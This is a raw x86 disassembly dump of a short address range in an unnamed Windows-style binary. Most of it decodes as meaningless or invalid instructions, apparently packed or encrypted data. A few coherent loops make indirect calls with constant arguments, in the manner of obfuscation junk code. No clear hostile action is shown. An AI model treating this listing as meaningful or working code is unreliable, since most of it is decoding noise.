  40a0d4:	pop    es
  40a0d5:	xchg   esi,eax
  40a0d6:	inc    edi
  40a0d7:	xlat   BYTE PTR ds:[ebx]
  40a0d8:	shr    dh,cl
  40a0da:	test   bl,dh
  40a0dc:	adc    al,0x2e
  40a0de:	xchg   ecx,eax
  40a0df:	mov    ebx,0x5cc89d64
  40a0e4:	push   ss
  40a0e5:	and    al,0x2e
  40a0e7:	sti    
  40a0e8:	out    dx,al
  40a0e9:	xor    DWORD PTR [ecx],esi
  40a0eb:	aad    0x93
  40a0ed:	xor    eax,0x53fe91a4
  40a0f2:	cmp    BYTE PTR [ecx],al
  40a0f4:	or     BYTE PTR [esi+0x1f],cl
  40a0f7:	cmp    DWORD PTR [edi-0x2ba9c713],ebx
  40a0fd:	mov    al,0x62
  40a0ff:	sub    al,0x9d
  40a101:	mov    cl,al
  40a103:	jge    0x40a10b
  40a105:	xchg   BYTE PTR [esi+0xf587a04],ch
  40a10b:	and    BYTE PTR [eax],cl
  40a10d:	cmp    bl,BYTE PTR [ebx+0x13]
  40a110:	mov    esp,0xcf58068b
  40a115:	mov    dh,0xa4
  40a117:	div    al
  40a119:	push   0xec59711a
  40a11e:	mov    bl,0xd9
  40a120:	add    BYTE PTR [ecx],ah
  40a122:	hlt    
  40a123:	jmp    0x37bc:0x734540da
  40a12a:	push   ebx
  40a12b:	outs   dx,DWORD PTR ds:[esi]
  40a12c:	jle    0x40a151
  40a12e:	stc    
  40a12f:	sahf   
  40a130:	xor    ah,BYTE PTR [esi+0xebd4fc2]
  40a136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a137:	popa   
  40a138:	sub    dl,BYTE PTR [edx+0xbc3274f]
  40a13e:	sub    al,BYTE PTR [ebx+0x6d28aef4]
  40a144:	inc    eax
  40a145:	loopne 0x40a145
  40a147:	aaa    
  40a148:	jb     0x40a1a3
  40a14a:	mov    dh,0xad
  40a14c:	adc    ebp,DWORD PTR [edi*2+0x60619551]
  40a153:	jge    0x40a112
  40a155:	loop   0x40a0ee
  40a157:	fstp   QWORD PTR [ecx]
  40a159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a15a:	leave  
  40a15b:	enter  0xce32,0xc9
  40a15f:	out    0x17,al
  40a161:	stos   BYTE PTR es:[edi],al
  40a162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a163:	and    eax,0x7b94becf
  40a168:	jnp    0x40a1be
  40a16a:	cs cmc 
  40a16c:	push   cs
  40a16d:	sub    al,0x26
  40a16f:	pxor   mm1,QWORD PTR [ecx-0x7e]
  40a173:	arpl   WORD PTR [edi-0x36],bp
  40a176:	jo     0x40a19a
  40a178:	pop    ebp
  40a179:	mov    WORD PTR [eax+0x5a],gs
  40a17c:	loopne 0x40a161
  40a17e:	daa    
  40a17f:	mov    dl,0xfa
  40a181:	adc    dh,BYTE PTR [eax-0x31]
  40a184:	jl     0x40a138
  40a186:	jp     0x40a13d
  40a188:	and    edx,DWORD PTR cs:0x7904357a
  40a18f:	test   DWORD PTR [edi],esp
  40a191:	hlt    
  40a192:	mov    ebp,0x75505910
  40a197:	push   ebx
  40a198:	or     DWORD PTR [esi],ebx
  40a19a:	retf   
  40a19b:	lock ficomp WORD PTR ds:0x36664dfe
  40a1a2:	stos   BYTE PTR es:[edi],al
  40a1a3:	stos   BYTE PTR es:[edi],al
  40a1a4:	inc    esp
  40a1a5:	imul   edx,DWORD PTR [eax+eax*8-0x59fe2a85],0xffffffcd
  40a1ad:	pop    esp
  40a1ae:	pop    ecx
  40a1af:	jmp    0xf6b34e34
  40a1b4:	push   es
  40a1b5:	mul    BYTE PTR [edi+0x42]
  40a1b8:	inc    ecx
  40a1b9:	es into 
  40a1bb:	mov    esi,0xc2286a85
  40a1c0:	imul   ebx,DWORD PTR [edi],0xdb3e2031
  40a1c6:	inc    esi
  40a1c7:	push   es
  40a1c8:	lock pop ss
  40a1ca:	cmc    
  40a1cb:	aad    0x25
  40a1cd:	loope  0x40a162
  40a1cf:	or     dl,BYTE PTR ds:0xf373fe44
  40a1d5:	in     eax,0x3e
  40a1d7:	jns    0x40a173
  40a1d9:	or     bh,ah
  40a1db:	push   ecx
  40a1dc:	dec    ecx
  40a1dd:	mov    bh,0x6e
  40a1df:	mov    ds:0xa81e7d83,eax
  40a1e4:	mov    bl,0x3d
  40a1e6:	nop
  40a1e7:	add    eax,ecx
  40a1e9:	add    al,0x25
  40a1eb:	mov    esi,0xe838d140
  40a1f0:	ja     0x40a1d0
  40a1f2:	sahf   
  40a1f3:	outs   dx,DWORD PTR ds:[esi]
  40a1f4:	enter  0x904e,0x41
  40a1f8:	ja     0x40a1e7
  40a1fa:	xor    edx,DWORD PTR [edx]
  40a1fc:	cmc    
  40a1fd:	leave  
  40a1fe:	fisttp WORD PTR [ebx-0x27]
  40a201:	sahf   
  40a202:	mov    edi,0x79ebb390
  40a207:	lods   eax,DWORD PTR ds:[esi]
  40a208:	mov    ds:0x8a5ad058,eax
  40a20d:	mov    ah,0x7c
  40a20f:	xchg   ebp,eax
  40a210:	stos   DWORD PTR es:[edi],eax
  40a211:	aas    
  40a212:	bound  esi,QWORD PTR [eax+0x7f132421]
  40a218:	in     al,dx
  40a219:	fsubr  QWORD PTR [ecx]
  40a21b:	sbb    esi,DWORD PTR fs:[ebp-0x7aae8b8f]
  40a222:	mov    edi,0x55bf4f67
  40a227:	inc    ebx
  40a228:	loope  0x40a24d
  40a22a:	inc    ebx
  40a22b:	and    cl,ah
  40a22d:	loop   0x40a1f6
  40a22f:	inc    ebp
  40a230:	cld    
  40a231:	rol    DWORD PTR [ebp+0x45c7f89c],1
  40a237:	fdiv   DWORD PTR [ebx]
  40a239:	test   DWORD PTR [eax+edi*8+0x45c7d213],ebx
  40a240:	aam    0x32
  40a242:	test   DWORD PTR [eax+edi*8-0x292da7f],ebx
  40a249:	inc    edx
  40a24a:	add    BYTE PTR [eax],al
  40a24c:	add    BYTE PTR [eax],al
  40a24e:	add    cl,ch
  40a250:	sldt   WORD PTR [eax]
  40a253:	add    BYTE PTR [ebx],dh
  40a255:	ror    BYTE PTR [ebx],cl
  40a257:	adc    eax,0x42fd6d
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fd6d,edx
  40a263:	cmp    DWORD PTR ds:0x42fd6d,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fd6d,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e367
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e1a8,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e78f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	adc    eax,0x4507bee1
  40a2c9:	cmc    
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a2f5
  40a2d1:	cs and al,0x8f
  40a2d4:	and    ah,BYTE PTR [eax+edi*1+0x34]
  40a2d8:	add    edi,DWORD PTR [esi+ebp*2-0x6c4f3708]
  40a2df:	stos   DWORD PTR es:[edi],eax
  40a2e0:	sbb    BYTE PTR [edx],dh
  40a2e2:	lds    ebp,FWORD PTR [ebx-0x76]
  40a2e5:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2e7:	add    BYTE PTR [edx+0x52b50f2e],al
  40a2ed:	and    ebx,DWORD PTR [esi+0x1f]
  40a2f0:	nop
  40a2f1:	and    esp,edx
  40a2f3:	scas   eax,DWORD PTR es:[edi]
  40a2f4:	xchg   ebx,eax
  40a2f5:	scas   al,BYTE PTR es:[edi]
  40a2f6:	fmul   QWORD PTR [edi-0x9d9707]
  40a2fc:	imul   edi,DWORD PTR [ebx],0x7c
  40a2ff:	mov    eax,ds:0x2a95c47d
  40a304:	cli    
  40a305:	stos   BYTE PTR es:[edi],al
  40a306:	push   ebp
  40a307:	in     eax,dx
  40a308:	jbe    0x40a35a
  40a30a:	loope  0x40a37f
  40a30c:	push   edi
  40a30d:	ss sub edx,ecx
  40a310:	cs jecxz 0x40a31d
  40a313:	sahf   
  40a314:	cmp    bl,BYTE PTR [esi]
  40a316:	cs dec ebp
  40a318:	out    0xf5,eax
  40a31a:	cmp    bl,BYTE PTR [ebx]
  40a31c:	lock or dl,BYTE PTR [eax-0x4f]
  40a320:	popf   
  40a321:	ins    BYTE PTR es:[edi],dx
  40a322:	out    0x63,eax
  40a324:	inc    edx
  40a325:	sub    eax,0x85618caa
  40a32a:	bound  ebp,QWORD PTR [edx+0x1c]
  40a32d:	xor    cl,BYTE PTR [ebp+0x334b42c5]
  40a333:	inc    edx
  40a334:	mov    dl,0x66
  40a336:	es pop es
  40a338:	and    al,0xe4
  40a33a:	inc    ecx
  40a33b:	sti    
  40a33c:	inc    ebp
  40a33d:	jmp    0x8031:0x6a57d095
  40a344:	(bad)  
  40a345:	in     eax,0x2d
  40a347:	dec    ebp
  40a348:	(bad)  
  40a349:	out    dx,al
  40a34a:	xor    ebx,edx
  40a34c:	aas    
  40a34d:	js     0x40a38f
  40a34f:	popf   
  40a350:	mov    ah,0x9f
  40a352:	cwde   
  40a353:	in     eax,0xc8
  40a355:	test   al,0x29
  40a357:	loopne 0x40a3c4
  40a359:	adc    BYTE PTR [esi],bh
  40a35b:	fdivr  QWORD PTR [edx]
  40a35d:	iret   
  40a35e:	add    eax,0x69c547f5
  40a363:	test   al,0x31
  40a365:	add    DWORD PTR [esi],ebp
  40a367:	aaa    
  40a368:	sub    al,0x60
  40a36a:	nop
  40a36b:	cmp    ebx,DWORD PTR [ebx-0xcf1933b]
  40a371:	or     eax,0x56af932a
  40a376:	pusha  
  40a377:	les    edi,FWORD PTR [edi+ecx*2+0x57]
  40a37b:	lods   al,BYTE PTR ds:[esi]
  40a37c:	dec    eax
  40a37d:	mov    ebx,0xc12ff260
  40a382:	xchg   ebx,eax
  40a383:	nop
  40a384:	stc    
  40a385:	test   BYTE PTR [esi-0x38],0xd1
  40a389:	in     eax,0xe3
  40a38b:	aas    
  40a38c:	loope  0x40a3b9
  40a38e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a38f:	repz int3 
  40a391:	mov    bl,0x7f
  40a393:	and    eax,0x82687585
  40a398:	arpl   bx,ax
  40a39a:	lea    esp,[ecx+0x76736301]
  40a3a0:	cwde   
  40a3a1:	popa   
  40a3a2:	bnd jmp 0x2e9bdd70
  40a3a8:	or     ecx,ebx
  40a3aa:	push   ss
  40a3ab:	out    0xb0,al
  40a3ad:	xchg   edi,eax
  40a3ae:	ja     0x40a38b
  40a3b0:	jno    0x40a34e
  40a3b2:	dec    ebp
  40a3b3:	test   ch,bh
  40a3b5:	or     ah,bl
  40a3b7:	stc    
  40a3b8:	stos   DWORD PTR es:[edi],eax
  40a3b9:	loop   0x40a3bc
  40a3bb:	xor    DWORD PTR [ebp-0xc],0x51a0b969
  40a3c2:	xor    edx,DWORD PTR [edx+0x6b]
  40a3c5:	lahf   
  40a3c6:	fs push cs
  40a3c8:	gs jle 0x40a370
  40a3cb:	(bad)  
  40a3cc:	jmp    0x40a391
  40a3ce:	cmc    
  40a3cf:	adc    al,0xc7
  40a3d1:	pop    es
  40a3d2:	imul   edi,DWORD PTR cs:[esi],0x3be8c4f5
  40a3d9:	xchg   ebx,eax
  40a3da:	mov    ebx,0x96e57bfb
  40a3e0:	popf   
  40a3e1:	or     BYTE PTR [edi-0x2e],0x69
  40a3e5:	xchg   DWORD PTR [ecx+eax*8-0x1efa1370],esp
  40a3ec:	lds    esp,FWORD PTR [edx-0x46]
  40a3ef:	inc    esp
  40a3f0:	fild   WORD PTR [eax-0x7b25c658]
  40a3f6:	push   edi
  40a3f7:	ja     0x40a3f4
  40a3f9:	sub    BYTE PTR [ebx+0x1b],cl
  40a3fc:	mov    eax,0xc5152688
  40a401:	jle    0x40a3dd
  40a403:	scas   al,BYTE PTR es:[edi]
  40a404:	std    
  40a405:	jnp    0x40a42c
  40a407:	jns    0x40a423
  40a409:	inc    esi
  40a40a:	mov    gs,WORD PTR [ebx+0x7b3fe875]
  40a410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a411:	cmp    ebx,DWORD PTR [ebp-0x50d90179]
  40a417:	idiv   BYTE PTR [esi+0x7f]
  40a41a:	mov    ebx,DWORD PTR [edi]
  40a41c:	sbb    DWORD PTR [esi],edx
  40a41e:	mov    dh,0x20
  40a420:	sti    
  40a421:	jmp    0x7e130983
  40a426:	popf   
  40a427:	inc    edx
  40a428:	add    DWORD PTR [edx+0x10],esi
  40a42b:	pop    ecx
  40a42c:	sbb    BYTE PTR [ebp+eiz*2-0x28],ch
  40a430:	jne    0x40a428
  40a432:	mov    eax,0x42c9eb4
  40a437:	aam    0x33
  40a439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a43a:	xchg   edx,eax
  40a43b:	cmc    
  40a43c:	dec    ecx
  40a43d:	call   0x9b328aee
  40a442:	(bad)  
  40a444:	push   ds
  40a445:	or     DWORD PTR [edi],ebx
  40a447:	adc    DWORD PTR [eax+eax*4+0x29784ba2],ebp
  40a44e:	and    dl,BYTE PTR [edi+0x30]
  40a451:	or     BYTE PTR [ecx+0x63],dl
  40a454:	push   0x6b48ee28
  40a459:	stos   DWORD PTR es:[edi],eax
  40a45a:	mov    al,0x20
  40a45c:	xchg   edx,eax
  40a45d:	fstp   TBYTE PTR [ecx+ebx*8-0x4e2b2977]
  40a464:	clc    
  40a465:	in     al,0x6
  40a467:	add    cl,BYTE PTR [edx-0x4726e727]
  40a46d:	outs   dx,BYTE PTR ds:[esi]
  40a46e:	and    eax,DWORD PTR [ecx-0x80]
  40a471:	bound  edi,QWORD PTR [eax-0x2d]
  40a474:	and    ah,BYTE PTR [ebx+ecx*4-0x67c196ef]
  40a47b:	cld    
  40a47c:	adc    esp,DWORD PTR [ebx-0x5fd07d6c]
  40a482:	scas   al,BYTE PTR es:[edi]
  40a483:	add    ch,BYTE PTR [esp+ecx*2]
  40a486:	ja     0x40a4f3
  40a488:	cs daa 
  40a48a:	popa   
  40a48b:	mov    edi,0xf80d2838
  40a490:	(bad)  
  40a491:	or     ebx,DWORD PTR [ecx-0x3c]
  40a494:	dec    ecx
  40a495:	fst    QWORD PTR [ebp+edx*8-0x1f]
  40a499:	pop    edx
  40a49a:	xor    eax,0xab463fc
  40a49f:	fdivr  DWORD PTR [edi-0x1c]
  40a4a2:	outs   dx,BYTE PTR ds:[esi]
  40a4a3:	es js  0x40a4b4
  40a4a6:	fistp  WORD PTR [eax]
  40a4a8:	push   edi
  40a4a9:	sbb    BYTE PTR [ebx-0x1fdf6b22],bl
  40a4af:	dec    esp
  40a4b0:	xchg   esi,eax
  40a4b1:	pop    esp
  40a4b2:	cld    
  40a4b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4b4:	iret   
  40a4b5:	xor    DWORD PTR [eax],edx
  40a4b7:	or     bl,0x9
  40a4ba:	inc    eax
  40a4bb:	lds    ebp,FWORD PTR [ecx]
  40a4bd:	xor    eax,0xce41980b
  40a4c2:	inc    ebp
  40a4c3:	fild   WORD PTR [edi+eax*2+0xa71f036]
  40a4ca:	cwde   
  40a4cb:	adc    DWORD PTR [edi+0x63],ebx
  40a4ce:	imul   ebp,DWORD PTR [esi+0x3fd3bb6c],0x33a67f76
  40a4d8:	stos   DWORD PTR es:[edi],eax
  40a4d9:	adc    cl,BYTE PTR [eax]
  40a4db:	mov    eax,ds:0xa1e466c6
  40a4e0:	mov    bl,0x44
  40a4e2:	rcl    DWORD PTR [ebx],0xab
  40a4e5:	jne    0x40a54d
  40a4e7:	outs   dx,DWORD PTR ds:[esi]
  40a4e8:	fwait
  40a4e9:	and    eax,0xb5034eed
  40a4ee:	dec    edi
  40a4ef:	dec    ebp
  40a4f0:	out    dx,eax
  40a4f1:	inc    edi
  40a4f2:	fist   DWORD PTR [edx-0x2d]
  40a4f5:	inc    esp
  40a4f6:	mov    bl,0xe9
  40a4f8:	in     eax,0x2
  40a4fa:	js     0x40a509
  40a4fc:	dec    ecx
  40a4fd:	push   edx
  40a4fe:	pop    ebp
  40a4ff:	(bad)  
  40a500:	mov    cl,0x53
  40a502:	sar    DWORD PTR ds:0xf071be0c,cl
  40a508:	add    al,0xba
  40a50a:	mov    cl,BYTE PTR [edi+0x5d]
  40a50d:	xor    esi,DWORD PTR ds:0x4b2d153f
  40a513:	lahf   
  40a514:	arpl   si,di
  40a516:	adc    al,0x2b
  40a518:	inc    eax
  40a519:	sub    DWORD PTR [edx-0x42d4f93c],0x67
  40a520:	sbb    cl,BYTE PTR [ecx]
  40a522:	sub    bh,dh
  40a524:	mov    ?,ebx
  40a526:	shl    DWORD PTR [ebx+0x68c6d73],0xdb
  40a52d:	shl    BYTE PTR [esi],0x34
  40a530:	cmp    bh,cl
  40a532:	fidiv  WORD PTR [edx+edx*2+0x21cdedf0]
  40a539:	fcomp  st(0)
  40a53b:	retf   0xd093
  40a53e:	push   esi
  40a53f:	dec    eax
  40a540:	dec    ecx
  40a541:	cmp    esp,DWORD PTR [ebp+0x7a5ef693]
  40a547:	(bad)  
  40a548:	adc    eax,0xd1cea0c8
  40a54d:	je     0x40a561
  40a54f:	inc    dl
  40a551:	cmp    bh,ah
  40a553:	push   ebp
  40a554:	es pop ebp
  40a556:	jns    0x40a5d5
  40a558:	xchg   bl,ah
  40a55a:	sbb    eax,DWORD PTR [ecx+eax*1-0x1a7ce8ef]
  40a561:	jnp    0x40a529
  40a563:	and    eax,0x3b27661
  40a568:	mov    ebx,0x7c1635d5
  40a56d:	daa    
  40a56e:	into   
  40a56f:	nop
  40a570:	(bad)  
  40a571:	das    
  40a572:	jl     0x40a5ac
  40a574:	in     eax,dx
  40a575:	pop    ds
  40a576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a577:	xor    DWORD PTR [edx],edx
  40a579:	xchg   al,dh
  40a57b:	in     eax,dx
  40a57c:	push   ss
  40a57d:	ins    DWORD PTR es:[edi],dx
  40a57e:	mov    fs,WORD PTR [ebx+ecx*1]
  40a581:	pop    edx
  40a582:	push   cs
  40a583:	in     al,dx
  40a584:	gs ret 
  40a586:	jbe    0x40a520
  40a588:	fcom   st(2)
  40a58a:	lea    ebp,[ecx+0xf5f771d]
  40a590:	int    0x4f
  40a592:	xor    eax,DWORD PTR [esi-0x1c]
  40a595:	jnp    0x40a561
  40a597:	adc    bh,dh
  40a599:	xchg   ebx,eax
  40a59a:	in     al,0x67
  40a59c:	enter  0xa799,0xf6
  40a5a0:	shl    DWORD PTR [eax],0x40
  40a5a3:	adc    esp,edi
  40a5a5:	lods   eax,DWORD PTR ds:[esi]
  40a5a6:	mov    edi,0xbea39d1f
  40a5ab:	je     0x40a5c3
  40a5ad:	gs push ebp
  40a5af:	in     al,dx
  40a5b0:	mov    ch,0xed
  40a5b2:	mov    ds:0x71a538fc,al
  40a5b7:	xor    al,0xa5
  40a5b9:	dec    eax
  40a5ba:	ror    BYTE PTR [edx-0x1bd60fe6],cl
  40a5c0:	dec    ebx
  40a5c1:	fsubrp st(4),st
  40a5c3:	add    DWORD PTR [edi+0x3f],edx
  40a5c6:	dec    esp
  40a5c7:	call   0x6bdd:0x7cb888d0
  40a5ce:	out    0x69,al
  40a5d0:	cld    
  40a5d1:	imul   ecx,DWORD PTR [esi],0xf6dfc8d0
  40a5d7:	sbb    esi,DWORD PTR [edx]
  40a5d9:	sub    ecx,DWORD PTR [ebp+0x58]
  40a5dc:	mov    esp,0x4d14f59a
  40a5e1:	scas   al,BYTE PTR es:[edi]
  40a5e2:	fwait
  40a5e3:	mov    ds:0xeee66167,eax
  40a5e8:	push   0x91e12f80
  40a5ed:	sub    eax,0x26c3bae7
  40a5f2:	pop    esi
  40a5f3:	pop    ebx
  40a5f4:	outs   dx,BYTE PTR ds:[esi]
  40a5f5:	jp     0x40a661
  40a5f7:	pop    ds
  40a5f8:	xlat   BYTE PTR ds:[ebx]
  40a5f9:	sub    eax,0x13a6034e
  40a5fe:	pop    es
  40a5ff:	(bad)  
  40a600:	stos   DWORD PTR es:[edi],eax
  40a601:	icebp  
  40a602:	inc    edx
  40a603:	repnz inc ecx
  40a605:	icebp  
  40a606:	out    dx,eax
  40a607:	xor    DWORD PTR [edi],ecx
  40a609:	int    0x1f
  40a60b:	call   0x18020c25
  40a610:	jle    0x40a66e
  40a612:	outs   dx,BYTE PTR ds:[esi]
  40a613:	push   ecx
  40a614:	inc    ebx
  40a615:	lods   eax,DWORD PTR ds:[esi]
  40a616:	mov    esi,0x991a2262
  40a61b:	out    0x2b,al
  40a61d:	push   edi
  40a61e:	test   BYTE PTR [edi],bh
  40a620:	and    DWORD PTR [ecx+0x2e],ebp
  40a623:	enter  0x55c5,0xce
  40a627:	cmp    dh,BYTE PTR [edx+0x7e9e65]
  40a62d:	mov    ebp,0xb32faf0e
  40a632:	cmp    eax,edx
  40a634:	inc    edx
  40a635:	les    ebx,FWORD PTR [ebx-0x66]
  40a638:	nop
  40a639:	or     dl,dh
  40a63b:	das    
  40a63c:	or     edi,edi
  40a63e:	inc    eax
  40a63f:	dec    ebp
  40a640:	je     0x40a6bd
  40a642:	int    0xff
  40a644:	(bad)  
  40a645:	xor    cl,BYTE PTR [esi]
  40a647:	out    dx,eax
  40a648:	xchg   ecx,eax
  40a649:	cli    
  40a64a:	ret    
  40a64b:	loope  0x40a602
  40a64d:	in     eax,0xa3
  40a64f:	jnp    0x40a62d
  40a651:	and    edx,ebp
  40a653:	push   0xd19b421c
  40a658:	or     edx,edx
  40a65a:	inc    eax
  40a65b:	addr16 (bad) 
  40a65d:	or     al,0xef
  40a65f:	jnp    0x40a62f
  40a661:	aam    0x83
  40a663:	adc    DWORD PTR [ecx+0x53],esp
  40a666:	icebp  
  40a667:	jae    0x40a6ab
  40a669:	sub    DWORD PTR [edx+eax*8],ebp
  40a66c:	mov    ecx,0xd593d3ee
  40a671:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e76f,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e76f
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e76f,edx
  40a698:	cmp    DWORD PTR ds:0x42e76f,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e777
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e36b
  40a6c6:	cmp    DWORD PTR ds:0x42e76f,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e76f
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e76f,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e76f,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fd5d,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fd5d
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fd5d,edx
  40a709:	cmp    DWORD PTR ds:0x42fd5d,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fd5d,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e2ed
  40a728:	push   0x42e2db
  40a72d:	call   DWORD PTR ds:0x42e5c7
  40a733:	cmp    DWORD PTR ds:0x42fd5d,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fd5d
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fd5d,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e1b4
  40a75a:	xor    edi,DWORD PTR ds:0x42e793
  40a760:	mov    DWORD PTR ds:0x42e1b4,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e793,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fd51
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fd65,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e793,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fd79,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd89,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e1b0,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e1b0,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e1b0,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e267
  40a7e8:	push   0x42e2bd
  40a7ed:	push   0x42e2bd
  40a7f2:	call   DWORD PTR ds:0x42e36f
  40a7f8:	cmp    DWORD PTR ds:0x42e1b0,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e1b0
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e1b0,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e1b0
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e1b0,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e1ac,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fdee
  40a839:	add    DWORD PTR ds:0x42e787,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	or     al,BYTE PTR [ebp+0xc]
  40a856:	out    0xe4,eax
  40a858:	icebp  
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a803
  40a860:	and    ebx,DWORD PTR [ecx-0x26]
  40a863:	dec    edx
  40a864:	and    eax,0xe9c2a76
  40a869:	rcl    bl,cl
  40a86b:	jmp    0x6428:0x78751566
  40a872:	jmp    0x35a342ed
  40a877:	adc    bl,bh
  40a879:	sub    ebx,ebx
  40a87b:	aam    0x1d
  40a87d:	outs   dx,DWORD PTR ds:[esi]
  40a87e:	xchg   ecx,eax
  40a87f:	stos   BYTE PTR es:[edi],al
  40a880:	fstp   DWORD PTR [eax-0x6b9ef8e9]
  40a886:	mov    edx,0xfa3b2ac7
  40a88b:	and    dl,BYTE PTR ds:0x204174b4
  40a891:	imul   BYTE PTR [bx+0x7f24]
  40a896:	mov    ds:0xb0db9ee1,eax
  40a89b:	push   0xd7072ece
  40a8a0:	test   BYTE PTR [edi],0xd8
  40a8a3:	ret    0xfd9
  40a8a6:	leave  
  40a8a7:	and    eax,0x74fb901a
  40a8ac:	lock ins DWORD PTR es:[edi],dx
  40a8ae:	jo     0x40a837
  40a8b0:	push   eax
  40a8b1:	cmp    eax,0xbf9350f
  40a8b6:	popa   
  40a8b7:	adc    al,0x68
  40a8b9:	sti    
  40a8ba:	mov    esi,0x897574c4
  40a8bf:	xchg   ebx,eax
  40a8c0:	push   edx
  40a8c1:	je     0x40a8aa
  40a8c3:	mov    bh,0xd1
  40a8c5:	mov    DWORD PTR [edi+edi*4-0x36],edi
  40a8c9:	xchg   ebx,eax
  40a8ca:	fsubr  QWORD PTR [ebp-0x1d877f03]
  40a8d0:	adc    al,0x2f
  40a8d2:	push   0x255affdb
  40a8d7:	pushf  
  40a8d8:	inc    ebp
  40a8d9:	pop    ecx
  40a8da:	loopne 0x40a93e
  40a8dc:	iret   
  40a8dd:	ins    DWORD PTR es:[edi],dx
  40a8de:	repz les esp,FWORD PTR [eax+0x7]
  40a8e2:	fmul   st(6),st
  40a8e4:	sbb    eax,0x66603ac8
  40a8e9:	jg     0x40a8b5
  40a8eb:	shl    edi,0xea
  40a8ee:	and    al,0x7b
  40a8f0:	imul   esi,DWORD PTR [ebx+0x797f101a],0xfffffff0
  40a8f7:	(bad)  
  40a8f8:	sbb    DWORD PTR [ecx+edx*8-0x61],edx
  40a8fc:	lahf   
  40a8fd:	inc    edx
  40a8fe:	daa    
  40a8ff:	in     al,0xa3
  40a901:	xchg   ecx,eax
  40a902:	push   esp
  40a903:	rol    BYTE PTR [edx+0x782302c6],1
  40a909:	add    dh,BYTE PTR [ebx-0x37]
  40a90c:	adc    eax,0xe6acfcef
  40a911:	add    al,0x8
